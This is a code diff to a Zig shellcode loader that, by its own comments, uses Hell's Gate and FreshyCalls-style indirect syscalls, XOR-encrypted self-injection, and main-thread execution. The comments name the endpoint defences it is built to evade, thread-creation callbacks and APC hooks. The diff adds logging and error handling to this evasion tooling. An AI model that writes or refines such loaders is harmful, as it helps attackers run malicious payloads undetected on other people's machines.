@@ -1,9 +1,7 @@
 // hells gate shellcode loader. self-injection, per-build random xor key, peb walk.
 // FreshyCalls SSN resolution + indirect syscalls with random gadget pool.
 // execution: direct call on the main thread, then park forever.
-// no new thread (PsSetCreateThreadNotifyRoutineEx flags start addresses outside
-// image memory), no APC (hmpalert.dll hooks ntdll!KiUserApcDispatcher — a
-// user-mode delivery point, unreachable by syscall or ETW tricks).
+// no new thread, no APC — nothing for thread callbacks or APC hooks to catch.
 const std = @import("std");
 const windows = std.os.windows;
 const nt = @import("nt.zig");
@@ -46,12 +44,18 @@ pub fn main() void {
         return;
     }
 
+    info("payload  : {d} bytes, {d}-byte xor key (per-build random)", .{ shellcode.len, key_bytes.len });
+    info("delivery : self-inject, direct call on main thread + park", .{});
+
     // resolve syscall SSNs and gadgets via peb walk + FreshyCalls.
     g_sys = syscall.Syscalls.resolve() orelse {
         err("failed to resolve syscalls", .{});
         return;
     };
-    ok("syscalls resolved via PEB walk", .{});
+    ok("syscalls resolved via PEB walk + RecycledGate", .{});
+    print("    NtAllocateVirtualMemory  ssn={d}\n", .{g_sys.NtAllocateVirtualMemory.number});
+    print("    NtProtectVirtualMemory   ssn={d}\n", .{g_sys.NtProtectVirtualMemory.number});
+    print("    NtDelayExecution         ssn={d}\n", .{g_sys.NtDelayExecution.number});
 
     const current_process: windows.HANDLE = nt.NtCurrentProcess;
     var base_addr: ?*anyopaque = null;
@@ -77,30 +81,34 @@ pub fn main() void {
     const buffer: [*]u8 = @ptrCast(base_addr);
     @memcpy(buffer[0..shellcode.len], shellcode);
     for (buffer[0..shellcode.len], 0..) |*b, i| b.* ^= key_bytes[i % key_bytes.len];
-    info("shellcode decrypted ({d} bytes, {d}-byte XOR key)", .{ shellcode.len, key_bytes.len });
+    ok("decrypted in-place ({d} bytes)", .{shellcode.len});
     jitter(10, 30);
 
     // rw → rx.
     var old_protect: windows.ULONG = 0;
-    _ = syscall.syscall_dispatch(
+    const prot_status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
         g_sys.NtProtectVirtualMemory.number,
         &[_]usize{
             @intFromPtr(current_process), @intFromPtr(&base_addr),
             @intFromPtr(&size), nt.PAGE_EXECUTE_READ, @intFromPtr(&old_protect),
         },
         5,
-    );
-    ok("memory protected to RX", .{});
+    ))));
+    if (!nt.NT_SUCCESS(prot_status)) {
+        err("NtProtectVirtualMemory failed: 0x{X} — running from RW memory", .{@intFromEnum(prot_status)});
+    } else {
+        ok("memory protected to RX", .{});
+    }
     jitter(5, 15);
 
     // direct call on the main thread. if the payload starts its own threads and
     // returns (Donut does), park this thread forever so the process stays alive.
     // alertable=0 — no APC can ever be delivered on this thread again.
-    info("executing shellcode on main thread", .{});
+    info("executing on main thread (no new thread, no APC)", .{});
     const entry: *const fn () callconv(.c) void = @ptrCast(base_addr);
     entry();
 
-    info("shellcode returned, parking thread", .{});
+    info("payload returned — parking thread (NtDelayExecution, alertable=0)", .{});
     const day: i64 = -@as(i64, 24 * 60 * 60 * 10_000_000);
     while (true) {
         _ = syscall.syscall_dispatch(g_sys.NtDelayExecution.number, &[_]usize{ 0, @intFromPtr(&day) }, 2);
